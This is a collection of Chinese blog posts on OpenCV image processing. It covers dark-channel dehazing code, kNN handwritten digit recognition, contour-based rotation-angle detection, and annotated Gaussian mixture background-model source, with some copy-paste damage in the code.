	cvCopy(in,r);//将三个通道的的值分别存入r，g，b三块内存区域中

	//cvSplit(src,dst1,dst2,dst3,NULL);

	int height = in->height;//获取输入图像的宽高等信息
	int width = in->width;
	int i,j,k;//用于循环的变量
	uchar *data_w;
	uchar *data_b;
	uchar *data_g;
	uchar *data_r;
	int step = b->widthStep/sizeof(uchar);
	data_w = (uchar *)w->imageData;//指向输出图像的数据头
	data_b = (uchar *)b->imageData;//指向输出图像的数据头
	data_g = (uchar *)g->imageData;//指向输出图像的数据头
	data_r = (uchar *)r->imageData;//指向输出图像的数据头
	for(i=0;i<height;i++)
		{
       for(j=0;j<width;j++)   
          { 
			  double b,g,r;
			  int MIN;//b,g,r三个通道的最小值
			  b = data_b[i*step+j];
			  g = data_g[i*step+j];
			  r = data_r[i*step+j];
			  MIN = (int)min(b,g,r);
			  data_w[i*step+j] = MIN;
		  };
		};
	cout<<"计算三个通道最小值并组成一幅新灰度图的函数运行成功"<<"\n";//表示该函数运行成功
	return w;
}	;
IplImage* doCalculateV(IplImage* w,IplImage* diff,IplImage* smooth)
{
    IplImage* b = cvCreateImage(cvSize(w->width,w->height),w->depth,1);
	IplImage* v = cvCreateImage(cvSize(w->width,w->height),w->depth,1);
	int height = w->height;//获取输入图像的宽高等信息
	int width = w->width;
	int i,j,k;//用于循环的变量
	uchar *data_w;
	uchar *data_diff;
	uchar *data_v;
	uchar *data_b;
	uchar *data_smooth;
	int step = w->widthStep/sizeof(uchar);
	data_w = (uchar *)w->imageData;//指向输出图像的数据头
	data_diff = (uchar *)diff->imageData;//指向输出图像的数据头
	data_v = (uchar *)v->imageData;//指向输出图像的数据头
	data_b = (uchar *)b->imageData;//指向输出图像的数据头
	data_smooth = (uchar *)smooth->imageData;
	for(i=0;i<height;i++)
		{
       for(j=0;j<width;j++)   
          { 
			  double W;
			  double DIFF;
			  double B;
			  double SMOOTH;
			  double p = 0.78;//p = 0.78
			  double MIN,MAX;
			  W = data_w[i*step+j];
			  DIFF = data_diff[i*step+j];
			  SMOOTH = data_smooth[i*step+j];
			  B = W-DIFF;
			  MIN = min2(B,SMOOTH);
			  MAX = max(MIN,0);
			  data_v[i*step+j] = p*MAX;
		  };
		};
	cout<<"计算v函数运行成功"<<"\n";//表示该函数运行成功
	return v;
};
//计算最终的去雾图像的函数
IplImage* doFinally(IplImage* in,IplImage* v,double A)
{
	IplImage* b = cvCreateImage(cvSize(in->width,in->height),in->depth,1);
	IplImage* g = cvCreateImage(cvSize(in->width,in->height),in->depth,1);
	IplImage* r = cvCreateImage(cvSize(in->width,in->height),in->depth,1);
	IplImage* result = cvCreateImage(cvSize(in->width,in->height),in->depth,3);//创建存储输出图像的内存区域
	int height = in->height;//获取输入图像的宽高等信息
	int width = in->width;
	int i,j;//用于循环的变量
	cvSetImageCOI(in,1);
	cvCopy(in,b);
	cvSetImageCOI(in,2);
	cvCopy(in,g);
	cvSetImageCOI(in,3);
	cvCopy(in,r);//将三个通道的的值分别存入r，g，b三块内存区域中
	//cvSplit(in,b,g,r,NULL);//将图像拆分为三个通道
	uchar *data_b;
	uchar *data_g;
	uchar *data_r;
	uchar *data_v;
	int step = b->widthStep/sizeof(uchar);
	//data_w = (uchar *)w->imageData;//指向输出图像的数据头
	data_b = (uchar *)b->imageData;//指向蓝色通道的数据头
	data_g = (uchar *)g->imageData;//指向绿色通道的数据头
	data_r = (uchar *)r->imageData;//指向红色通道的数据头
	data_v = (uchar *)v->imageData;
	//计算蓝色通道的去雾结果
	for(i=0;i<height;i++)
		{
       for(j=0;j<width;j++)   
          { 
			  double B,G,R,V,VAB,VAG,VAR;
			  V = data_v[i*step+j];
			  B = data_b[i*step+j];
			  VAB = fabs(B-V)/(fabs(1-V/A));   //会有一些值大于256，需要进行归一化
			  if(VAB>255)
				  VAB = 255;
			  else
				  VAB = VAB;
			  data_b[i*step+j] = VAB;
			  G = data_g[i*step+j];
			  VAG = fabs(G-V)/(fabs(1-V/A));
			  if(VAG>255)
				  VAG = 255;
			  else
				  VAG = VAG;
			  data_g[i*step+j] = VAG;
			  R = data_r[i*step+j];
			  VAR = fabs(R-V)/(fabs(1-V/A));
			  if(VAR>255)
				  VAR = 255;
			  else
				  VAR = VAR;
			  data_r[i*step+j] = VAR;
		  };
		};
	cvMerge(b,g,r,NULL,result);//这个函数可能也有问题~
	cout<<"最终去雾算法运行成功"<<"\n";//表示该函数运行成功
	return result;

}

int main(int argc, char** argv)
{ 
	cvNamedWindow("Source Image");
	cvNamedWindow("Result Image");
	IplImage* image = cvLoadImage("D:/4.bmp",1);  //input a image，0表示以灰度图形式读入图像，-1表示以图像自身真实通道数读入图像，1表示以三通道读入图像
													//此处可改成自己的图片路径
	cvShowImage("Source Image",image);//显示源图像
	int patchsize = 20;
	//IplImage* out = doDarkChannel(image,patchsize);//不能直接将返回的图像数据赋给一个未指定大小的指针，
	IplImage* out = cvCreateImage(cvSize(image->width,image->height),image->depth,3);//创建存储输出图像的内存区域
	IplImage* w = cvCreateImage(cvSize(image->width,image->height),image->depth,1);//创建存储输出图像的内存区域
	//cvCopy(doDarkChannel(image,patchsize),out);//将patchsize大小的图像块存入临时图像块patch_out
	IplImage* smooth = cvCreateImage(cvSize(image->width,image->height),image->depth,1);//创建存储输出图像的内存区域
	IplImage* diff = cvCreateImage(cvSize(image->width,image->height),image->depth,1);//存储w与I_smooth差值绝对值的的内存区域
	IplImage* v = cvCreateImage(cvSize(image->width,image->height),image->depth,1);//存储w与I_smooth差值绝对值的的内存区域
	int A_MAX = doDarkChannel(image,patchsize);//求取暗通道的最大值，A_MAX相当于Matlab中的A，传入doFinally
	cvCopy(doMinChannel(image),w);//计算三个通道的最小值并以最小值组成一副灰度图，进行下一步高斯平滑
	//w计算没问题

	cvSaveImage("D://result//w.bmp",w);

	cvSmooth(w,smooth,CV_GAUSSIAN,39,39,4.5,4.5);//39x39;不使用相关而使用卷积进行计算，将边界点复制得到拓展边界
	
	cvSaveImage("D://result//smooth.bmp",smooth);

	cvAbsDiff(smooth,w,diff);
	//diff有问题，应该是由于smooth导致的
	cvSaveImage("D://result//diff.bmp",diff);

	cvCopy(doCalculateV(w,diff,smooth),v);//计算v，v的含义从matlab代码中可找到，v传入doFinally进行最终的结果计算
	//v有问题；由于smooth有问题，w没问题，diff有问题，导致v有问题
	cvSaveImage("D://result//v.bmp",v);
	cvCopy(doFinally(image,v,A_MAX),out);//计算最终的去雾结果的函数的调用
	//cvSaveImage("D://v.bmp",v);//测试能否顺利产生图像v的代码
	cout<<"A_MAX="<<A_MAX<<"\n";

	cvSaveImage("D://result//finally.bmp",out);

	cvShowImage("Result Image",out);//imshow the result
	cvWaitKey(0);
	cvReleaseImage(&image);//release the storage space
	cvReleaseImage(&out);//release the storage space
	cvReleaseImage(&w);//release the storage space
	cvReleaseImage(&smooth);//release the storage space
	cvReleaseImage(&diff);//release the storage space
	cvReleaseImage(&v);//release the storage space
	cvDestroyWindow("Source Image");  
	cvDestroyWindow("Result Image");
	//system("pause"); //避免一闪而过
	return 0;
}

 
 
 
 
 
 
 
参考文献：
http://www.tuicool.com/articles/Mv2iiu
http://blog.csdn.net/holybang/article/details/28093305
http://www.tuicool.com/articles/MJZr2e
http://blog.sina.com.cn/s/blog_4d8730df0100m8lz.html
 
 






 
摘要
本程序主要参照论文，《基于OpenCV的脱机手写字符识别技术》实现了，对于手写阿拉伯数字的识别工作。识别工作分为三大步骤：预处理，特征提取，分类识别。预处理过程主要找到图像的ROI部分子图像并进行大小的归一化处理，特征提取将图像转化为特征向量，分类识别采用k-近邻分类方法进行分类处理，最后根据分类结果完成识别工作。
程序采用Microsoft Visual Studio 2010与OpenCV2.4.4在Windows 7-64位旗舰版系统下开发完成。并在Windows xp-32位系统下测试可用。
主流程图：

 
细化流程图：

 
 
 
1.   预处理
预处理的过程就是找到图像的ROI区域的过程，如下图所示：
 


首先找到数字的边界框，然后大小归一化数字图片，主要流程如下图所示：
 
 


 
主要代码：
IplImagepreprocessing(IplImage*imgSrc,intnew_width,intnew_height)
{
       
IplImage* result;
       
IplImage* scaledResult;
 
       
CvMat data;
       
CvMat dataA;
      CvRectbb;//bounding box
      CvRectbba;//boundinb box maintain aspect ratio
       

      //Find bounding box找到边界框
       
bb=findBB(imgSrc);
       
cvGetSubRect(imgSrc, &data,cvRect(bb.x,bb.y,bb.width,bb.height));
       
int size=(bb.width>bb.height)?bb.width:bb.height;
       
result=cvCreateImage( 
cvSize( size, size ), 8, 1 );
       
cvSet(result,CV_RGB(255,255,255),NULL);
      //将图像放中间，大小归一化
       
int x=(int)floor((float)(size-bb.width)/2.0f);
       
int y=(int)floor((float)(size-bb.height)/2.0f);
       
cvGetSubRect(result, &dataA,cvRect(x,y,bb.width,bb.height));
       
cvCopy(&data, &dataA,NULL);
      //Scale result
       
scaledResult=cvCreateImage( 
cvSize( new_width, 
new_height ), 8, 1 );
       
cvResize(result, 
scaledResult, CV_INTER_NN);
       

      //Return processed data
      return *scaledResult;//直接返回处理后的图片
       

}
 
 
2.   特征提取
在拿到ROI图像减少了信息量之后，就可以直接用图片作为向量矩阵作为输入:
voidbasicOCR::getData()
{
       
IplImage* src_image;
       
IplImage prs_image;
       
CvMat row,data;
       
char file[255];
       
int i,j;
       
for(i =0; i<classes;i++)//总共10个数字
       {
             for(j = 0;
j<train_samples;j++)//每个数字50个样本
              {
                    
                    //加载所有的样本pbm格式图像作为训练
                    if(j<10)
                           sprintf(file,"%s%d/%d0%d.pbm",file_path,i,i
 , j);
                    else
                           sprintf(file,"%s%d/%d%d.pbm",file_path,i,i
 , j);
                    src_image =cvLoadImage(file,0);
                    if(!src_image)
                     {
                           printf("Error: Cant load image %s\n",file);
                           //exit(-1);
                     }
                    //process file
                    prs_image =preprocessing(src_image,size,size);
                    //生成训练矩阵，每个图像作为一个向量
                    cvGetRow(trainClasses, &row,i*train_samples
 +j);
                    cvSet(&row,cvRealScalar(i));
                    //Set data
                    cvGetRow(trainData, &row,i*train_samples
 +j);
 
                    IplImage*img =
cvCreateImage(cvSize(
size, size ), 

IPL_DEPTH_32F, 1 );
                    //转换换 8 bits image to 32位浮点数图片取值区间为[0,1]
                    //scale = 0.0039215 = 1/255; 
                    cvConvertScale(&prs_image,img, 0.0039215, 0);
 
                    cvGetSubRect(img, &data,cvRect(0,0,size,size));
                    
                    CvMatrow_header, *row1;
                    //convert data matrix sizexsize to vecor
                    row1 =cvReshape( &data, &row_header,
 0, 1 );
                    cvCopy(row1, &row,NULL);
              }
       }
}
 
 
3.   分类识别
识别方法采用knn近邻分类法。这个算法首先贮藏所有的训练样本，然后通过分析（包括选举，计算加权和等方式）一个新样本周围K个最近邻以给出该样本的相应值。这种方法有时候被称作“基于样本的学习”，即为了预测，我们对于给定的输入搜索最近的已知其相应的特征向量。
K最近邻(k-Nearest Neighbor，KNN)分类算法，是一个理论上比较成熟的方法，也是最简单的机器学习算法之一。该方法的思路是：如果一个样本在特征空间中的k个最相似(即特征空间中最邻近)的样本中的大多数属于某一个类别，则该样本也属于这个类别。KNN算法中，所选择的邻居都是已经正确分类的对象。该方法在定类决策上只依据最邻近的一个或者几个样本的类别来决定待分样本所属的类别。 KNN方法虽然从原理上也依赖于极限定理，但在类别决策时，只与极少量的相邻样本有关。由于KNN方法主要靠周围有限的邻近的样本，而不是靠判别类域的方法来确定所属类别的，因此对于类域的交叉或重叠较多的待分样本集来说，KNN方法较其他方法更为适合。
识别工作主要有以下几个步骤：
1. 初始化机器学习算法，及其训练
knn=new CvKNearest( trainData, trainClasses, 0, false, K );
因为trainData, trainClasses数据已得到。训练在CvKNearest算法初始化中已经完成
2. 识别
获取识别测试的数据，testData
result=knn->find_nearest(testData,K,0,0,nearest,0);
result为返回的识别的结果
 
 
4.   实验结果
在knn参数k=5，子图像向量大小选取128*128像素，训练样本50副图片，测试样本50副图片，系统误识率为7.4%。对于用户手写阿拉伯数字2的识别结果为2，识别比较准确。

 
 
 
5.   未来的工作
本程序主要参照网上的一些实例完成了部署跟实验工作，虽然仅仅完成了手写阿拉伯数字的识别工作，但是字符识别的一些原理工作都是相同的，未来能够从一下几个方面进行提高：
1.      提高程序的识别准确率，从一些文献实现的结果来看，简单的模型结合大量的训练样本，往往效果比复杂的模型结合少量训练样本实现的效果好。
2.      扩展程序的功能，从实现简单的字符到最终实现识别手写汉字等。
3.      提高识别速度，改进算法为并行算法，实现如联机在线识别等。
 
 
6.主要参考文献：
http://blog.csdn.net/jackmacro/article/details/7026211
http://blog.damiles.com/2008/11/basic-ocr-in-opencv/
http://blog.csdn.net/zhubenfulovepoem/article/details/6803150
http://blog.csdn.net/firehood_/article/details/8433077
http://blog.csdn.net/viewcode/article/details/7943341
 
 
7.项目打包下载
http://download.csdn.net/detail/wangyaninglm/6631953
 
8.手写字符识别的复杂版本，这个增加了一些OpenGL技术，程序比较复杂
http://blog.csdn.net/wangyaninglm/article/details/41848019






 

 
 
程序没有写完整，大概功能就是实现了，希望大家分享学习，把他改对
 
// FindRotation-angle.cpp : 定义控制台应用程序的入口点。
//

// findContours.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"



#include <iostream>
#include <vector>
#include <opencv2/opencv.hpp> 
#include <opencv2/core/core.hpp>
#include <opencv2/imgproc/imgproc.hpp>
#include <opencv2/highgui/highgui.hpp>


#pragma comment(lib,"opencv_core2410d.lib")      
#pragma comment(lib,"opencv_highgui2410d.lib")      
#pragma comment(lib,"opencv_imgproc2410d.lib") 

#define PI 3.1415926

int main()
{
	// Read input binary image

	char *image_name = "test2.jpg";
	cv::Mat image = cv::imread(image_name,0);
	if (!image.data)
		return 0; 

	cv::namedWindow("Binary Image");
	cv::imshow("Binary Image",image);


	
	// 从文件中加载原图  
	   IplImage *pSrcImage = cvLoadImage(image_name, CV_LOAD_IMAGE_UNCHANGED);  
	  
		   // 转为2值图
		
	 cvThreshold(pSrcImage,pSrcImage,200,255,cv::THRESH_BINARY_INV);
		   
	
	   image = cv::Mat(pSrcImage,true);

	   cv::imwrite("binary.jpg",image);

	// Get the contours of the connected components
	std::vector<std::vector<cv::Point>> contours;
	cv::findContours(image, 
		contours, // a vector of contours 
		CV_RETR_EXTERNAL, // retrieve the external contours
		CV_CHAIN_APPROX_NONE); // retrieve all pixels of each contours

	// Print contours' length
	std::cout << "Contours: " << contours.size() << std::endl;
	std::vector<std::vector<cv::Point>>::const_iterator itContours= contours.begin();
	for ( ; itContours!=contours.end(); ++itContours) 
	{

		std::cout << "Size: " << itContours->size() << std::endl;
	}

	// draw black contours on white image
	cv::Mat result(image.size(),CV_8U,cv::Scalar(255));
	cv::drawContours(result,contours,
		-1, // draw all contours
		cv::Scalar(0), // in black
		2); // with a thickness of 2

	cv::namedWindow("Contours");
	cv::imshow("Contours",result);






	// Eliminate too short or too long contours
	int cmin= 100;  // minimum contour length
	int cmax= 1000; // maximum contour length
	std::vector<std::vector<cv::Point>>::const_iterator itc= contours.begin();
	while (itc!=contours.end()) {

		if (itc->size() < cmin || itc->size() > cmax)
			itc= contours.erase(itc);
		else 
			++itc;
	}

	// draw contours on the original image
	cv::Mat original= cv::imread(image_name);
	cv::drawContours(original,contours,
		-1, // draw all contours
		cv::Scalar(255,255,0), // in white
		2); // with a thickness of 2

	cv::namedWindow("Contours on original");
	cv::imshow("Contours on original",original);

	

	// Let's now draw black contours on white image
	result.setTo(cv::Scalar(255));
	cv::drawContours(result,contours,
		-1, // draw all contours
		cv::Scalar(0), // in black
		1); // with a thickness of 1
	image= cv::imread("binary.jpg",0);

	// testing the bounding box 
	


	

	std::vector<std::vector<cv::Point>>::const_iterator itc_rec= contours.begin();
	while (itc_rec!=contours.end())
	{
		cv::Rect r0= cv::boundingRect(cv::Mat(*(itc_rec)));
		cv::rectangle(result,r0,cv::Scalar(0),2);
			++itc_rec;
	}

	

	cv::namedWindow("Some Shape descriptors");
	cv::imshow("Some Shape descriptors",result);


	CvBox2D     End_Rage2D;

	CvMemStorage *storage = cvCreateMemStorage(0);  //开辟内存空间


	CvSeq*      contour = NULL;     //CvSeq类型 存放检测到的图像轮廓边缘所有的像素值，坐标值特征的结构体以链表形式

	cvFindContours( pSrcImage, storage, &contour, sizeof(CvContour),CV_RETR_CCOMP, CV_CHAIN_APPROX_NONE);//这函数可选参数还有不少



	for(; contour; contour = contour->h_next)   //如果contour不为空，表示找到一个以上轮廓，这样写法只显示一个轮廓
		//如改为for(; contour; contour = contour->h_next) 就可以同时显示多个轮廓
	{  

		End_Rage2D = cvMinAreaRect2(contour);    //代入cvMinAreaRect2这个函数得到最小包围矩形  这里已得出被测物体的角度，宽度,高度，和中点坐标点存放在CvBox2D类型的结构体中，主要工作基本结束。
	
	std::cout <<" angle:\n"<<(float)End_Rage2D.angle << std::endl;      //被测物体旋转角度 
	
	}
	cv::waitKey();
	return 0;


}

 
 
 

 
 
重新写了一下这个代码，还是稍微有点小问题，希望大家共同探讨：
 
http://blog.csdn.net/wangyaninglm/article/details/43959947
 
 






OpenCV混合高斯模型函数注释说明
一、cvaux.h
#define CV_BGFG_MOG_MAX_NGAUSSIANS   500
//高斯背景检测算法的默认参数设置
#define CV_BGFG_MOG_BACKGROUND_THRESHOLD     0.7     //高斯分布权重之和阈值
#define CV_BGFG_MOG_STD_THRESHOLD               2.5     //λ=2.5（99%）
#define CV_BGFG_MOG_WINDOW_SIZE                  200    //学习率α=1/win_size
#define CV_BGFG_MOG_NGAUSSIANS                   5       //k=5个混合高斯模型
#define CV_BGFG_MOG_WEIGHT_INIT                  0.05	 //初始权重
#define CV_BGFG_MOG_SIGMA_INIT                   30		 //初始标准差
#define CV_BGFG_MOG_MINAREA                     15.f		 //？？？

#define CV_BGFG_MOG_NCOLORS                      3       //颜色通道数
/************* CV_BG_STAT_MODEL_FIELDS()的宏定义**********************/ 
#define CV_BG_STAT_MODEL_FIELDS()                                                   
    int             type; 		//type of BG model
    CvReleaseBGStatModel release;  //                                               \
    CvUpdateBGStatModel update;                                                     \
    IplImage*       background;   /*8UC3 reference background image*/               \
    IplImage*       foreground;   /*8UC1 foreground image*/                         \
    IplImage**      layers;       /*8UC3 reference background image, can be null */ \
    int             layer_count;  /* can be zero */                                 \
    CvMemStorage*   storage;      /*storage for foreground_regions?/              \
    CvSeq*          foreground_regions /*foreground object contours*/
/*************************高斯背景模型参数结构体*************************/
typedef struct CvGaussBGStatModelParams
{    
    int     win_size;     //等于 1/alpha
    int     n_gauss;      //高斯模型的个数
    double  bg_threshold, std_threshold, minArea;	// bg_threshold：高斯分布权重之和阈值、std_threshold：2.5、minArea：？？？
    double  weight_init, variance_init;		//权重和方差
}CvGaussBGStatModelParams;
/**************************高斯分布模型结构体***************************/
typedef struct CvGaussBGValues
{
    int         match_sum;
    double      weight;
    double      variance[CV_BGFG_MOG_NCOLORS];
    double      mean[CV_BGFG_MOG_NCOLORS];
}
CvGaussBGValues;
typedef struct CvGaussBGPoint		
{
    CvGaussBGValues* g_values;
}
CvGaussBGPoint;
/*************************高斯背景模型结构体*************************/
typedef struct CvGaussBGModel
{
    CV_BG_STAT_MODEL_FIELDS();
    CvGaussBGStatModelParams   params;    
    CvGaussBGPoint*            g_point;    
    int                        countFrames;
}
CvGaussBGModel;
二、cvbgfg_gaussmix.cpp
//////////////////////////////////////////////////////////// cvCreateGaussianBGModel////////////////////////////////////////////////////////////////
功能：高斯背景模型变量bg_model初始化赋值
CV_IMPL CvBGStatModel* cvCreateGaussianBGModel( IplImage* first_frame, CvGaussBGStatModelParams* parameters)
{
    CvGaussBGModel* bg_model = 0;		//高斯背景状态模型变量
    
    CV_FUNCNAME( "cvCreateGaussianBGModel" );
    
    __BEGIN__;
    
    double var_init;
    CvGaussBGStatModelParams params;	//高斯背景状态模型参数变量
    int i, j, k, n, m, p;
    //初始化参数，如果参数为空，则进行初始化赋值
    if( parameters == NULL )
    {
        params.win_size = CV_BGFG_MOG_WINDOW_SIZE;		//学习率α=1/200=0.005
        params.bg_threshold = CV_BGFG_MOG_BACKGROUND_THRESHOLD;	//判断是否为背景点的阈值0.7
        params.std_threshold = CV_BGFG_MOG_STD_THRESHOLD;//标准阈值2.5
        params.weight_init = CV_BGFG_MOG_WEIGHT_INIT;		//权重值0.05
        params.variance_init = CV_BGFG_MOG_SIGMA_INIT*CV_BGFG_MOG_SIGMA_INIT; //方差30*30
        params.minArea = CV_BGFG_MOG_MINAREA;			//？？？
        params.n_gauss = CV_BGFG_MOG_NGAUSSIANS;		//高斯模型个数
    }
    else
    {
        params = *parameters;
    }
    
    if( !CV_IS_IMAGE(first_frame) )		//如果第一帧不是图像，则报错
        CV_ERROR( CV_StsBadArg, "Invalid or NULL first_frame parameter" );
    
    CV_CALL( bg_model = (CvGaussBGModel*)cvAlloc( sizeof(*bg_model) ));	//申请内存空间
    memset( bg_model, 0, sizeof(*bg_model) );
    bg_model->type = CV_BG_MODEL_MOG;		// CV_BG_MODEL_MOG高斯背景模型
    bg_model->release = (CvReleaseBGStatModel)icvReleaseGaussianBGModel;	//释放内存的函数指针
    bg_model->update = (CvUpdateBGStatModel)icvUpdateGaussianBGModel;	//更新高斯模型的函数指针    
bg_model->params = params;

    //申请内存空间
    CV_CALL( bg_model->g_point = (CvGaussBGPoint*)cvAlloc(sizeof(CvGaussBGPoint)*
        ((first_frame->width*first_frame->height) + 256)));		//256?
    
    CV_CALL( bg_model->background = cvCreateImage(cvSize(first_frame->width,
        first_frame->height), IPL_DEPTH_8U, first_frame->nChannels));
    CV_CALL( bg_model->foreground = cvCreateImage(cvSize(first_frame->width,
        first_frame->height), IPL_DEPTH_8U, 1));
    
    CV_CALL( bg_model->storage = cvCreateMemStorage());
    
    //初始化
    var_init = 2 * params.std_threshold * params.std_threshold;		//初始化方差
    CV_CALL( bg_model->g_point[0].g_values =
        (CvGaussBGValues*)cvAlloc( sizeof(CvGaussBGValues)*params.n_gauss*
        (first_frame->width*first_frame->height + 128)));			//128?
	//n：表示像素点的索引值
	//p：表示当前像素对应颜色通道的首地址
	// g_point[]：对应像素点、g_values[]：对应高斯模型、variance[]和 mean[]：对应颜色通道
    for( i = 0, p = 0, n = 0; i < first_frame->height; i++ )		//行
    {
        for( j = 0; j < first_frame->width; j++, n++ )		//列
        {
            bg_model->g_point[n].g_values = bg_model->g_point[0].g_values + n*params.n_gauss;//每个像素点的第一个高斯模型的地址（每个像素对应n_gauss个高斯分布模型）

		   //初始化第一个高斯分布模型的参数
            bg_model->g_point[n].g_values[0].weight = 1;    //取较大权重，此处设置为1
            bg_model->g_point[n].g_values[0].match_sum = 1;//高斯函数被匹配的次数（？？？）
            for( m = 0; m < first_frame->nChannels; m++)	   //对各颜色通道的方差和均值赋值
            {
                bg_model->g_point[n].g_values[0].variance[m] = var_init;	//初始化较大的方差
                bg_model->g_point[n].g_values[0].mean[m] = (unsigned char)first_frame->imageData[p + m];														//赋值为当前像素值
            }

		   //初始化剩下的高斯分布模型的参数
            for( k = 1; k < params.n_gauss; k++)
            {
                bg_model->g_point[n].g_values[k].weight = 0;//各高斯分布取相等且较小权重值，此处取0
                bg_model->g_point[n].g_values[k].match_sum = 0;
                for( m = 0; m < first_frame->nChannels; m++)
{
                    bg_model->g_point[n].g_values[k].variance[m] = var_init; //初始化较大的方差
                    bg_model->g_point[n].g_values[k].mean[m] = 0;		  //赋值0
                }
            }
            p += first_frame->nChannels;
        }
    }
    
    bg_model->countFrames = 0;
    
    __END__;
    
    if( cvGetErrStatus() < 0 )
    {
        CvBGStatModel* base_ptr = (CvBGStatModel*)bg_model;
        
        if( bg_model && bg_model->release )
            bg_model->release( &base_ptr );
        else
            cvFree( &bg_model );
        bg_model = 0;
    }
    
    return (CvBGStatModel*)bg_model;
}
////////////////////////////////////////////////////////// icvUpdateGaussianBGModel ///////////////////////////////////////////////////////////////
功能：对高斯背景模型变量bg_model进行更新
static int CV_CDECL icvUpdateGaussianBGModel( IplImage* curr_frame, CvGaussBGModel*  bg_model )
{
    int i, j, k;
    int region_count = 0;
    CvSeq *first_seq = NULL, *prev_seq = NULL, *seq = NULL;
    
    bg_model->countFrames++;
    
    for( i = 0; i < curr_frame->height; i++ )	//行
    {
        for( j = 0; j < curr_frame->width; j++ )	//列
        {
            int match[CV_BGFG_MOG_MAX_NGAUSSIANS];
            double sort_key[CV_BGFG_MOG_MAX_NGAUSSIANS];
            const int nChannels = curr_frame->nChannels;	//通道数目
            const int n = i*curr_frame->width+j;			//像素索引值
            const int p = n*curr_frame->nChannels;		//像素点颜色通道的首地址
            
            // A few short cuts
            CvGaussBGPoint* g_point = &bg_model->g_point[n];
            const CvGaussBGStatModelParams bg_model_params = bg_model->params;
            double pixel[4];
            int no_match;
            
            for( k = 0; k < nChannels; k++ )		//拷贝各通道颜色分量值
                pixel[k] = (uchar)curr_frame->imageData[p+k];
            
            no_match = icvMatchTest( pixel, nChannels, match, g_point, &bg_model_params );
		   //判断高斯背景模型更新帧数是否达到设置值win_size（？？？）
（初始更新阶段和一般更新阶段在更新处理过程中是不同的，其中定义初始更新阶段为帧数小于win_size）
            if( bg_model->countFrames == bg_model->params.win_size )	//一般更新阶段
            {
                icvUpdateFullWindow( pixel, nChannels, match, g_point, &bg_model->params );
                if( no_match == -1)
                    icvUpdateFullNoMatch( curr_frame, p, match, g_point, &bg_model_params );
            }
            else
            {
                icvUpdatePartialWindow( pixel, nChannels, match, g_point, &bg_model_params );
                if( no_match == -1)
                    icvUpdatePartialNoMatch( pixel, nChannels, match, g_point, &bg_model_params );
            }
            icvGetSortKey( nChannels, sort_key, g_point, &bg_model_params );
            icvInsertionSortGaussians( g_point, sort_key, (CvGaussBGStatModelParams *)&bg_model_params );
            icvBackgroundTest( nChannels, n, p, match, bg_model );
        }
    }
    
    //foreground filtering
    
    //filter small regions
    cvClearMemStorage(bg_model->storage);
    
    //cvMorphologyEx( bg_model->foreground, bg_model->foreground, 0, 0, CV_MOP_OPEN, 1 );
    //cvMorphologyEx( bg_model->foreground, bg_model->foreground, 0, 0, CV_MOP_CLOSE, 1 );
    
    cvFindContours( bg_model->foreground, bg_model->storage, &first_seq, sizeof(CvContour), CV_RETR_LIST );
    for( seq = first_seq; seq; seq = seq->h_next )
    {
        CvContour* cnt = (CvContour*)seq;
        if( cnt->rect.width * cnt->rect.height < bg_model->params.minArea )
        {
            //delete small contour
            prev_seq = seq->h_prev;
            if( prev_seq )
            {
                prev_seq->h_next = seq->h_next;
                if( seq->h_next ) seq->h_next->h_prev = prev_seq;
            }
            else
            {
                first_seq = seq->h_next;
                if( seq->h_next ) seq->h_next->h_prev = NULL;
            }
        }
        else
        {
            region_count++;
        }
    }
    bg_model->foreground_regions = first_seq;
    cvZero(bg_model->foreground);
    cvDrawContours(bg_model->foreground, first_seq, CV_RGB(0, 0, 255), CV_RGB(0, 0, 255), 10, -1);
    
    return region_count;
}
//////////////////////////////////////////////////////////// icvMatchTest ////////////////////////////////////////////////////////////////
功能：将当前像素与个高斯分布进行匹配判断，如果匹配成功，则返回相应高斯分布的索引值
static int icvMatchTest( double* src_pixel, int nChannels, int* match,
                         const CvGaussBGPoint* g_point,
                         const CvGaussBGStatModelParams *bg_model_params )
{
    int k;
    int matchPosition=-1;
    for ( k = 0; k < bg_model_params->n_gauss; k++) match[k]=0;	//高斯分布匹配标识数组初始化置0
    
for ( k = 0; k < bg_model_params->n_gauss; k++)
{
        double sum_d2 = 0.0;
        double var_threshold = 0.0;
        for(int m = 0; m < nChannels; m++)	//计算当前高斯分布各通道均值与像素点各通道值相减
{
            double d = g_point->g_values[k].mean[m]- src_pixel[m];
            sum_d2 += (d*d);
            var_threshold += g_point->g_values[k].variance[m];
        }  //difference < STD_LIMIT*STD_LIMIT or difference**2 < STD_LIMIT*STD_LIMIT*VAR
        var_threshold = _model_params->std_threshold*bg_model_params->std_threshold*var_threshold;
//匹配方程为：或者
        if(sum_d2 < var_threshold)
{
            match[k] = 1;		//匹配时标识置1
            matchPosition = k;	//存储匹配的高斯分布索引值
            break;				//一旦匹配，就终止与后续高斯分布的匹配
        }
    }
    
    return matchPosition;		//返回匹配上的高斯分布索引值
}
//////////////////////////////////////////////////// icvUpdateFullWindow ////////////////////////////////////////////////////////////
功能：更新各高斯分布的权重值（对于匹配上的高斯分布要增大权值，其余的减小权值），如果存在匹配上的高斯分布，还要更新其均值和方差。
static void icvUpdateFullWindow( double* src_pixel, int nChannels, int* match,
                                 CvGaussBGPoint* g_point,
                                 const CvGaussBGStatModelParams *bg_model_params )
{
    const double learning_rate_weight = (1.0/(double)bg_model_params->win_size);	//学习率α
for(int k = 0; k < bg_model_params->n_gauss; k++)
{
	   //若match[k]=0，则权重ω的更新公式：
	   //若match[k]=0，则权重ω的更新公式：
        g_point->g_values[k].weight = 
g_point->g_values[k].weight + (learning_rate_weight*((double)match[k] -g_point->g_values[k].weight));
        if(match[k])			//更新匹配的高斯分布的参数
{
            //参数学习率
double learning_rate_gaussian =         (double)match[k]/(g_point->g_values[k].weight*(double)bg_model_params->win_size);	
            for(int m = 0; m < nChannels; m++)
{
                const double tmpDiff = src_pixel[m] - g_point->g_values[k].mean[m];
			  //均值μ更新公式为：
                g_point->g_values[k].mean[m] = 
g_point->g_values[k].mean[m] +(learning_rate_gaussian * tmpDiff);
			 //方差更新公式为：
                g_point->g_values[k].variance[m] = g_point->g_values[k].variance[m]+
                    (learning_rate_gaussian*((tmpDiff*tmpDiff) - g_point->g_values[k].variance[m]));
            }
        }
    }
}
//////////////////////////////////////////////////// icvUpdateFullNoMatch ////////////////////////////////////////////////////////////
功能：当前像素点与所有高斯分布都不匹配时，需要将比值最小的高斯分布替换为新的高斯分布（权值小、方差大），其余的高斯分布保持原来的均值和方差，但权值需要减小。
static void icvUpdateFullNoMatch( IplImage* gm_image, int p, int* match,
